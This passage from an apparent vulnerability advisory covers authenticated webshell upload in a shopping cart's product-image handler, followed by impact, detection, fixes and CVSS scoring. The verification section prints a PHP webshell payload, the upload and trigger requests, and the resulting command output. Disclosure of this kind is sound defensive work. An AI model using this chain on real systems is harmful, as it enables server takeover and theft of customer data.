  line, defaulting to `id`. It writes no file except itself, modifies no database row beyond the
  product and category the interface itself creates, and its cleanup branch only unlinks its own two
  objects in its own directory.

### Exploit Construction — what the exploit deliberately does not do

- It does not brute-force credentials, enumerate users, or attempt any login bypass.
- It does not exfiltrate data — no read of `control/_cfg.php`, no database dump, no order records.
  That capability is described in section 10 as impact, and was not exercised.
- It does not attempt privilege escalation, container escape or lateral movement.
- It does not install persistence beyond the single uploaded file, and it removes that file by
  default.
- It does not probe anything other than the target given on the command line, and it warns when that
  target is not loopback.
- It does not fuzz the two untested leads noted in section 4 (the download operation's path handling,
  and the un-normalised filename concatenation), because unverified behaviour does not belong in a
  published exploit.

## 9. Dynamic Verification

### Dynamic Verification — environment

The verification instance was built from the shipped 2.1 archive inside a container:

| Element | Value |
|---|---|
| Web tier | upstream `php:8.3-apache` image with `mysqli` and `gd` |
| Database tier | separate MySQL container on a private container network |
| Listener binding | loopback only |
| Apache configuration | `mod_rewrite` enabled, `AllowOverride All`, `session.save_path` on a writable temporary directory |
| Installation | installer run to completion, 32 tables created, installer directory removed afterwards |
| Administrator credential | chosen by us at installation time (the product has none to inherit) |
| Client | the verification script, Python 3 standard library only |

We stress the two configuration choices that a reader might reasonably read as researcher-supplied
convenience. `AllowOverride All` is the state in which the product's own shipped Apache deny files
function, so it reproduces the intended protection model. The loopback binding is a safety property of
our host, not of the product: the same chain works identically against a listener on any interface,
since nothing in the flow depends on source address.

### Dynamic Verification — the triggering request

The request that creates the executable object is a single multipart POST. Its essential shape:

```text
POST /admin/index.php?ajax-ops=add HTTP/1.1
X-CSRF-Token: <100 hex characters bound to the administrator session>
Content-Type: multipart/form-data; boundary=----MaianPalBoundary<random>
Cookie: PHPSESSID=<administrator session>

fm[name]=poc-prd-<rand>&fm[slug]=...&fm[cats][]=<cat_id>&...
fm[ifile][]: filename="x_6da06855.php", body="<?php echo \"RCE_OK_MP:\"; system($_GET[\"cmd\"]); ?>"
```

and the request that executes it:

```text
GET /content/products/2/x_6da06855.php?cmd=id HTTP/1.1
```

### Dynamic Verification — observed output

The script's own output from a verification run, reproduced verbatim except that the final
confirmation line printed by that revision of the script carried an internal label which is not part
of the evidence and is not reproduced here:

```text
[*] Target: http://127.0.0.1:8787
[*] Step 1: fetch login page + extract CSRF token
[+] CSRF token: <100 hex characters, value withheld>
[*] Step 2: login as admin
[+] Login OK
[*] Step 3a: create a category (required by product add validation)
[+] Category created: id=1
[*] Step 3b: upload PHP shell as product picture
[*] Add response: {"status":"ok","txt":["Completed","Product successfully added<hr><div class=\"controlButtons\"><a href=\"?p=add&amp;id=2\"><i class=\"fa fa-edit fa-fw\"></i><span class=\"hidden-xs\"> Update Product</
[+] Product id: 2
[*] Step 4: trigger shell at content/products/2/x_6da06855.php
[+] Shell response:
RCE_OK_MP:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

What each part of this proves:

- `Login OK` — the supplied administrator credential was accepted and a session was established,
  which is the precondition the whole finding is scoped by.
- `Category created: id=1` — the create flow's validation dependency was satisfied through the
  product's own interface, not by database manipulation.
- `Add response {"status":"ok" ... ?p=add&amp;id=2}` — the application itself reported a successful
  product create, and disclosed the product id that determines the storage directory. This is the
  application's own view of the request: from its perspective, a legitimate product with an image was
  added.
- `Shell response: RCE_OK_MP:uid=33(www-data) ...` — the marker proves the response body was produced
  by PHP code execution rather than by static file serving, and the `id` output proves the executing
  process runs as the web server's service account. This is the entire claim of the advisory in one
  line.

Supporting target-side proof from the same engagement: in an earlier round of the same verification a
marker file was written to an absolute path **outside** the document root and read back from the host
afterwards, establishing that command execution is not confined to echoing over HTTP — it produces
real filesystem effects at the service account's privilege level. Rounds were repeated three times
with distinct random filenames, and every round produced the same `uid=33(www-data)` identity.

### Dynamic Verification — the negative control and why it matters

A control matters here because the claim is specifically that **the extension governs execution**,
not that the upload path is broken in some diffuse way. If an ordinary image uploaded through the
identical flow were also to be executed, the diagnosis would be different and the fix would be
different.

We are precise about which controls were run and which were not:

- **Ran: repeated trials.** Three independent executions with distinct random filenames, plus the
  out-of-web-root marker check. These establish reproducibility; they are not controls, and we do not
  present them as such.
- **Ran: structural contrasts inside the product.** The shipped code supplies two of its own. First,
  `thumbnail()` behaves differently by content type: `getimagesize()` succeeds for a real image and
  produces a genuine reduced thumbnail, while for a PHP file it fails and the code falls through to
  `@copy()`. Second, our review of the shipped PHP tree found the attachment-upload path applying an
  extension allow-list alongside a deny rule of its own; that comparison is a source-level reading we
  did not reduce to a line citation, whereas `admin/import/` carrying `Deny from all` and
  `content/products/` carrying nothing are both anchored artifacts. Same product, same version,
  opposite treatment — this is the
  strongest available demonstration that the defect is an omission rather than a design decision.
- **Provided but not part of the recorded runs: `--control` in the shipped script.** The script
  published with this advisory carries a control mode that repeats the category and product steps
  with an ordinary one-pixel GIF named with an image extension, then asserts three things: the stored
  object is served back as image bytes, the execution marker never appears in the response, and a
  `.php` sibling with the same basename does not exist (HTTP 404). We state plainly that the recorded
  verification runs did not include this mode; it is shipped so that a reader can confirm the
  extension-versus-content distinction on their own instance in one command.

An inconclusive control is also possible and would be informative: if a deployment's Apache
configuration denies script execution across the whole of `content/`, the exploit step would fail
with a 403 or would return the source text without the marker. That outcome means the second half of
the root cause has been closed by the operator, and section 11 explains how to do that deliberately.

### Dynamic Verification — boundaries of what was verified

- **Verified:** the full chain — authenticated administrator, product-image upload of a `.php` file
  under shipped defaults, storage in a served directory without a deny rule, execution on request,
  command execution as `uid=33(www-data)`. Reproduced three times.
- **Not verified:** any `nginx` or PHP-FPM deployment; any IIS or Windows deployment; the
  `rename='yes'` configuration (argued from code only, as flagged); extensions other than `.php`; case
  variants of the extension; the download operation's path handling; the un-normalised filename
  concatenation question from section 6; `backup` / `restore` / `data-import`; whether the product's
  own installer ever writes a deny file into `content/products/` on some platform we did not observe;
  any non-Apache serving path; and any privilege escalation beyond the service account.
- **Not attempted:** data theft, database modification, persistence beyond the uploaded file,
  lateral movement, or exploitation of a live third-party system. All verification targeted our own
  instance.

## 10. Reachability and Security Impact

### Reachability and impact — network position

The sink sits on the product's ordinary web listener. There is no management network, no out-of-band
console and no privileged port: whoever can reach the shopping cart's administration login can, with
valid administrator credentials, reach the upload. For a self-hosted cart on a public host that means
the entire internet, subject to whatever front-end restrictions the operator has added. Nothing in
the chain depends on source address, session age beyond validity, user agent, or any request
ordering other than the one described. The vector is therefore `AV:N`, and the access complexity is
`AC:L`: no race, no uncommon configuration, no user interaction and no dependency on any state other
than the shipped defaults (`rename='no'` from `thumbcfg()`, no deny file in `content/products/`).

### Reachability and impact — what the achieved identity controls

`uid=33(www-data)` on a shopping-cart host is a high-value identity precisely because the application
is already trusted with everything a shop needs. Concretely, within what was observed and what that
identity conventionally permits:

- **Configuration and credentials, readable.** The web server user must read `control/_cfg.php` to
  function, so it contains the database credentials, the `SECRET_KEY` and the administrator
  credential material that the login path transforms. Everything the login gate protects is
  obtainable directly from disk. Any other secret the application stores — payment gateway keys,
  PayPal configuration, mail credentials, third-party API keys — is readable to the same identity.
- **Customer and order data, readable and writable.** With the database credentials from
  `control/_cfg.php`, the 32 installed tables are open: customer accounts in `shop_accounts`, orders,
  addresses, and any other personal data the store collects. This is a confidentiality impact on the
  store's customers, not merely on the operator.
- **Financial integrity, writable.** Prices, stock levels, discount rules and order contents are
  database rows. Silently rewriting a price or altering an order is an integrity impact with direct
  financial consequence, and it is invisible in the HTTP access log because it happens over the
  application's own database connection.
- **Persistence and defacement in the web root.** The service account can write to the directories it
  serves. A webshell in `content/products/<ID>/` survives restarts, session expiry and application
  updates; additional objects can be placed in theme directories, or an existing storefront template
  modified to include one, making removal incomplete if only the upload is cleaned.
- **Availability, destroyable.** Storefront content, product images and configuration files can be
  deleted or corrupted, and the database can be damaged with the application's own credential. The
  shop can be taken down and its catalogue lost.
- **A foothold on the host.** The service account's local view — environment variables, readable
  system files, other applications reachable on localhost, outbound network access from the host — is
  available for further activity. We did not pursue any of this, and we make no claim that it leads
  anywhere in a given deployment.

The **ceiling** is equally clear, and this advisory does not exceed it: no root, no host compromise,
no database-server compromise beyond what the application's own credentials grant, no container
escape, no evidence about other hosts. The demonstrated outcome is arbitrary command execution as the
web server service account.

### Reachability and impact — the unauthenticated question, answered in full

The obvious question about a shopping cart is whether any of this is reachable without credentials,
and the honest answer is no. Rather than leave that as a bare assertion, here is the negative result
in the detail it deserves:

- The storefront dispatcher `control/system/_ajax.php` exposes 56 AJAX operations with **no**
  `mswPerms()` gate — customers must be able to browse, add to basket and check out without logging
  in, so the absence is intentional. Operations include basket and checkout handling,
  `add`/`basket`/`checkout`/`pay`/`proceed-paypal`/`proceed-stripe`/`proceed-worldpay`, customer
  self-service (`register`, `login`, `logout`, `forgot`, `reset`, `edit-account`, `edit-password`),
  catalogue reads (`search`, `view-product`, `pagination`, `recent`), a file download (`dl-file`),
  comments, wishlists and subscription endpoints.
- Every one of those paths was classed by the primitives it reaches. On the unauthenticated side the
  only file-inclusion sinks found are `include()` of language files and of class files (download,
  PDF, TCPDF-related). No `move_uploaded_file()`, `exec()`, `system()`, `eval()` or `unserialize()`
  appears on those paths. There is unauthenticated upload of nothing, and unauthenticated execution
  of nothing.
- The administration login could not be bypassed, on the six specific axes listed in section 3 plus a
  secondary authentication branch and comparison-timing check. There is no factory credential to use
  and no administrator password-reset flow whose token could be predicted.
- Consequently the sink is reachable only from the administration side, whose 84 operations are all
  behind `mswPerms()`.

Two limits on this negative result, stated so it is not oversold. First, it addresses code execution:
it does **not** assert that those 56 endpoints are free of every other defect class. They handle
payment-gateway transitions, customer registration and password reset, order viewing and a file
download; access-control, injection, information-disclosure and business-logic defects in those areas
were not systematically audited, and `dl-file` in particular is an untested path-traversal candidate.
Second, "no code-execution sink" was established by enumerating the primitives on those paths in a
plain-text codebase — a method that is exhaustive for direct calls but does not, for example, prove
the absence of a dynamically constructed callback. We consider the conclusion sound for the question
asked and no broader.

### Reachability and impact — detection notes

Detection is difficult because the traffic is legitimate:

- **Access log.** One `POST /admin/index.php?ajax-ops=add` with a multipart body (indistinguishable
  from a normal product create at the request line), followed later by one or more
  `GET /content/products/<ID>/<name>.php`. The second pattern — a **`.php` request under a product
  image directory** — is the highest-value detection available and is almost never legitimate. A
  query string on that request (`?cmd=`) is a strong indicator.
- **Filesystem.** Non-image extensions inside `content/products/*/`, and in particular paired objects
  where a `tmb_`-prefixed file has the same non-image extension as its original. Both must be
  removed; deleting only the obvious name leaves the thumbnail copy.
- **Database.** Product and category rows created outside the operator's own activity, typically with
  generated-looking slugs. Deleting them does not necessarily remove the image directory.
- **Application audit trail.** The product reports both operations as successful; there is no
  application-level record of a suspicious filename, so the audit trail is the weakest of the four.
- **Post-compromise.** Treat `control/_cfg.php` contents (administrator secret, `SECRET_KEY`, database
  credentials) and any stored payment configuration as disclosed once a webshell has existed, and
  rotate all of them.

## 11. Fix Recommendations

The root cause has two halves, and the recommendations are ordered so that neither half is left
standing. A patch that only adds an allow-list still stores attacker-chosen filenames into a served
directory; a patch that only disables execution still lets an administrator-store-shaped request
deposit arbitrary content under the web root (and still leaves the filename normalisation question
from section 6 untouched). Both are required, and the first two below are the minimum acceptable
remediation.

### Fix Recommendations — vendor-side, ordered by root cause

**A. Close the handler: a real extension allow-list in `products::pictures()`.** Before the file is
written, resolve the extension from the client filename, normalise its case, and compare it against a
fixed permitted set. Reject everything else with a validation error rather than storing it.

```php
$allowed = array('jpg', 'jpeg', 'png', 'gif', 'webp');
$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed, true) || !preg_match('/^[A-Za-z0-9_.\-]+$/', $name)) {
    return $this->fail('Image type not permitted');
}
```

Apply the same validator to every file-accepting handler in the product so that the attachment path
and the product path cannot drift apart again — the divergence between them is the evidence that
per-handler checks decay over time. Note that the existing `rename='yes'` option is **not** a
substitute: as shown in section 5 it still takes the extension from `strrchr($name, '.')`.

**B. Close the directory: make the served upload tree non-executing, at server-configuration level.**
Ship a restriction consistent with the one already in `admin/import/`, and additionally document a
configuration that does not depend on `AllowOverride`:

```apache
# vhost / directory level, not dependent on .htaccess being honoured
<Directory "/var/www/html/content/products">
    <FilesMatch "\.ph(p[3457]?|t|tml|ar)$">
        Require all denied
        SetHandler none
    </FilesMatch>
    php_admin_flag engine off
    RemoveHandler .php .phtml .php3 .php4 .php5 .php7 .phar
    RemoveType .php .phtml .php3 .php4 .php5 .php7 .phar
    Options -ExecCGI -Indexes
</Directory>
```

```nginx
location ^~ /content/products/ {
    location ~ \.php$ { deny all; }
}
```

Two caveats for the vendor. First, `.htaccess` files are an Apache-only mechanism honoured only when
`AllowOverride` allows them; the product's *existing* protections inherit that limitation, so moving
the control into server configuration improves the whole family at once. Second, the equivalent rule
must be documented for `nginx`, where `.htaccess` has no effect whatsoever in either direction.

**C. Validate before writing, and roll back on failure.** Move `move_uploaded_file()` to *after*
`getimagesize()` (or `finfo`) succeeds, and delete the object if any later step fails. The current
order — write, then inspect, then `@copy()` on failure — is what leaves an executable object behind
when the content is not an image. Replace the suppressed copy fallback with an explicit error and a
cleanup, and never duplicate an object whose type could not be determined.

**D. Stop trusting the client filename.** Derive the stored name entirely server-side: a random or
sequential token plus a fixed extension chosen from the *validated* type, not from the submitted
string. Normalise away path separators before use, or better, never interpolate the client string into
a filesystem path at all. This also closes the un-normalised concatenation question raised in
section 6 without needing to establish whether traversal is currently reachable.

**E. Move uploads out of the served tree.** The structural fix is to store product images outside the
document root (or on separate storage) and serve them through a download operation that cannot
execute what it reads. This removes the second half of the root cause by construction rather than by
configuration, and it survives future changes to the web server.

**F. Reduce the credential blast radius.** These are contributing weaknesses and are not part of the
upload vector or its score, but they compound this finding, because the webshell reads the very file
that holds them: replace the single-round SHA-1 `mswEnc()` transform with `password_hash()`
(`PASSWORD_ARGON2ID`) storing a hash rather than a plaintext constant; compare with `hash_equals()`
and strict equality; keep `SECRET_KEY` for session/cookie signing only; and offer the operator
guidance (or an enforced step) for rotating the administrator secret and for network-restricting the
administration back-end. Given that the whole product surface is one administrator credential away
from operating-system command execution, a second factor on the back-end login is proportionate.

**G. Ship a regression test.** Two tests would have caught this and will catch its recurrence:

```php
// 1. behaviour: a .php upload through the product image operation must not be served as code
$resp = $client->post('admin/index.php?ajax-ops=add', $multipartWithPhpFilename);
$this->assertStringNotContainsString($marker, $client->get($storedUrl)->getBody());
$this->assertTrue(in_array($client->get($storedUrl)->getStatusCode(), [403, 404]));

// 2. packaging: every writable directory under the document root that can receive uploads
//    must carry an execution restriction
foreach ($uploadDirs as $dir) {
    $this->assertFileExists($dir . '/.htaccess', "no deny rule for " . $dir);
}
```

The second test is the one that generalises: it asserts the *consistency* property this advisory is
really about, so a newly added upload directory cannot ship unprotected.

### Fix Recommendations — operator-side, until a patch exists

1. Add the execution restriction from item B to your web server configuration for
   `content/products/` (and, for consistency, `admin/attachments/`, `admin/import/` and any theme
   cache directory). This is the single highest-value action and does not require a vendor patch.
2. If the deployment uses Apache, confirm `AllowOverride` actually applies to the directory before
   relying on any deny file the product ships; where possible enforce the rule in the vhost instead.
3. Add an edge rule that rejects requests for script extensions under any product-content path, for
   example a WAF or reverse-proxy match on `^/content/products/.*\.ph(p[3457]?|t|ml|ar)$`, and log
   such requests as security events.
4. Restrict reachability of `admin/index.php` — source-IP allow-list, an authenticating reverse
   proxy, or a VPN — so that possession of the administrator credential is not the only barrier.
5. Inventory the product image directories for non-image files now, including `tmb_`-prefixed
   objects, and remove them. Audit product and category rows created outside your own activity.
6. Run the web worker with the least privilege available: a dedicated service user, a read-only
   document root where the layout permits, and upload directories owned separately from the code.
7. Rotate after any suspected abuse: the administrator secret in `control/_cfg.php`, `SECRET_KEY`,
   the MySQL account and password, and every payment-gateway or API credential stored by the
   application. Assume the database contents were readable.
8. Monitor for the detection pattern in section 10 — a `POST ?ajax-ops=add` followed by a
   `GET /content/products/<ID>/<name>.php`, especially with a query string.
9. Do not assume the `rename` thumbnail option protects you. Read section 5 item 3.

## 12. CWE and CVSS

### CWE and CVSS — classification

- **CWE-434 — Unrestricted Upload of File with Dangerous Type (primary).** The handler accepts a file
  whose type it never validates and stores it with a client-controlled name and extension in a
  location the application expects to be publicly reachable.
- **CWE-94 — Improper Control of Generation of Code (contributing).** The stored object is
  subsequently interpreted as PHP by the server, which is what turns a file-write into code
  execution. It is listed as contributing rather than primary because no code is *generated* by the
  application; the interpreter supplies the semantics.
- **CWE-693 — Protection Mechanism Failure (contributing).** The served upload directory lacks the
  execution restriction that equivalent directories in the same product carry. This is the second
  half of the root cause and would be an independent defect even with a correct allow-list.
- **CWE-78 — OS Command Injection / command execution (realised consequence).** Our payload calls
  `system()` with a request parameter. This describes what the webshell does once it runs, not a
  separate defect in the product, and it is not scored separately.

Classification note: this is not CWE-22 (path traversal) — the demonstrated chain needs no traversal,
since the destination directory is already served. It is not CWE-798 or CWE-259 — there are no
hard-coded or default credentials, the installer forces the operator to choose them, and the sample
configuration ships a placeholder rather than a usable secret.

### CWE and CVSS — vector derivation

Published vector and score:

- **Score**: 7.2 High (CVSS:3.1)
- **Vector**: AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H = 7.2

Metric-by-metric justification:

- `AV:N` — the sink is reached over the ordinary HTTP(S) listener of a web application; no local or
  adjacent access is needed.
- `AC:L` — no race window, no user interaction, no uncommon configuration and no dependency on
  anything other than shipped product defaults (`thumbcfg()` `rename='no'`, no deny file in
  `content/products/`). The licence restriction does not obstruct the first product create.
- `PR:H` — only an authenticated administrator session was demonstrated. The credential pair is the
  one the installer provisions, `mswPerms()` gates every administration operation except login and
  logout, and no graduated back-end role was shown to reach `ajax-ops=add`. See the conditional
  reading below.
- `UI:N` — no victim browser or user action is involved. The attacker uses their own credentials;
  there is no forgery step that would require an administrator to click something.
- `S:U` — see the Scope decision below.
- `C:H` — the achieved identity reads the application's configuration (database credentials,
  `SECRET_KEY`, administrator secret), the customer and order tables, and stored payment
  configuration. Total loss of confidentiality within the application's own trust domain.
- `I:H` — the same identity writes anywhere the service account can write, including the web root
  (persistence, defacement) and, through the application's database credential, prices, stock,
  discount rules and order contents. Authorisation controls are entirely absent for that identity.
- `A:H` — storefront content, product images, configuration files and the database itself can be
  deleted or corrupted, taking the shop offline. Availability of the whole service is at that
  identity's discretion.

The arithmetic, using the CVSS version 3.1 formulas:

```text
Impact Sub-Score  ISS = 1 - ((1-0.56) * (1-0.56) * (1-0.56)) = 1 - 0.44^3 = 0.914816
Impact (S:U)          = 6.42 * 0.914816                       = 5.87311872
Exploitability        = 8.22 * AV(0.85) * AC(0.77) * PR(0.27) * UI(0.85) = 1.234707705
Base (S:U)            = min(5.87311872 + 1.234707705, 10)     = 7.107826425
Roundup               = ceil(7.107826425 * 10) / 10           = 7.2
```

The `PR:H` weight under Scope Unchanged is 0.27, and that single weight is what separates 7.2 from
8.8. It is the reason the privilege question is answered explicitly rather than assumed.

### CWE and CVSS — the Scope decision

`S:U` is correct here. Scope becomes Changed only when the vulnerable component's own authorization
boundary is crossed so that a *different* component, under a different security authority, is
impacted. In this chain:

- The vulnerable component is the administration back-end of the cart application.
- The impacted resources are the application's own files, its own database (reached with the very
  credentials the application itself holds) and the operating-system context of the web server
  process that the application runs inside.
- The achieved identity is the same service account the application always runs as, on the same host,
  inside the same trust domain. Nothing that was out of the application's reach before the upload is
  in reach afterwards.
- No cross-machine outcome was demonstrated. Pivoting to other hosts was not attempted and is not
  claimed, which is the usual basis on which a Scope-Changed reading would be argued for a webshell.

For completeness, the Scope-Changed variant of this vector computes higher and is **rejected**:
`AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` = 9.1. Publishing it would require demonstrating impact beyond
the vulnerable component's own authority — a database server compromise independent of the
application's credentials, a container escape, or a distinct host — and we demonstrated none of
those.

### CWE and CVSS — what is deliberately not published

**Rejected reading 1 — unauthenticated (9.8).** Because the product is a public-facing shopping cart,
the tempting headline is the unauthenticated vector
`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8. It is rejected: the storefront's 56 unauthenticated AJAX
operations contain no file-upload or command-execution primitive, the administration login was
reviewed on six bypass axes and none succeeded, and the product ships no factory credential and no
usable shipped `SECRET_KEY`. Nothing we found reduces the privilege requirement, so publishing 9.8
would be a false claim.

**Conditional reading — a lower-privileged back-end role (8.8).** The dispatcher exposes `users`,
`users-edit`, `permissions` and `permissions-edit`, so the product may model operator accounts
narrower than the single installer-provisioned administrator. Our review established `mswPerms()` as
an authentication gate over the dispatch, not as a per-operation authorization matrix, and we did not
demonstrate that any principal short of full administrator can reach `ajax-ops=add`. We therefore do
**not** publish this as the headline. It is offered as a conditional reading for the vendor to
confirm or refute: *if* a restricted back-end account (for example a catalogue editor) can create or
update products, then the least-privileged principal reaching the sink is that account, and the
correct rating becomes
`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = 8.8 (the `PR:L` weight under Scope Unchanged is 0.62, giving
Impact 5.87311872 plus Exploitability 2.83525473, base 8.70837345, rounded up). We did not round the
main rating up to that figure, because rounding up would assert a privilege model we did not observe.

**Rejected reading 3 — elevated complexity.** `AC:H` was considered and rejected: the chain has no
race, no ordering constraint beyond one POST and one GET, no dependency on a rare configuration, and
no need for the target to be in any particular state beyond a fresh or normal installation.
`AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H` = 6.6 is printed only so the rejection is auditable.

**Rejected reading 4 — user interaction.** `UI:R` was considered and rejected for the same reason
`PR:N` was: there is no forgery step requiring an administrator to visit a page.
`AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:H` = 6.8, printed for auditability only.

**Contributing weaknesses are not scored into this vector.** The SHA-1 credential transform, the loose
equality comparisons, the absence of any enforced rotation of the installer-provisioned secret, and
the inconsistency between handlers described in section 5 are real defects and are reported. They are
not folded into this vector, because none of them lowers the privilege required to reach the sink and
none of them raises the impact of the upload once it is reached. Unlike a finding that depends on an
unrotated factory credential, this one needs no deployment-state caveat to make its headline score
true.

**Recorded-score correction.** Our internal verification notes for this finding carry no numeric CVSS
base score, so there is no recorded figure that could disagree with a vector. The vector and score
published here were derived for this advisory using the arithmetic shown above, and were re-checked
against an independent implementation of the version 3.1 base formula before publication.

### CWE and CVSS — summary

| Reading | Vector | Base | Status |
|---|---|---|---|
| Published | AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H | 7.2 | Demonstrated — administrator session, `uid=33(www-data)` |
| Conditional | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H | 8.8 | Not demonstrated — depends on whether a restricted back-end role can manage product images |
| Rejected (Scope) | AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H | 9.1 | Rejected — same identity, same host, same authority |
| Rejected (unauth) | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 | Rejected — no unauthenticated route to the sink exists |
| Rejected (complexity) | AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H | 6.6 | Rejected — no race or special state required |
| Rejected (interaction) | AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:H | 6.8 | Rejected — no victim action required |

---

*Research and write-up by the 0day Rubbish Research Team. Technical detail published with a working proof of concept.*

- Advisory: https://0day-rubbish.com/blog/maian-pal-product-image-upload-webshell-rce
- Repository: https://github.com/Exploit-Garbage/0day-Rubbish
- Contact: disclosure@0day-rubbish.com
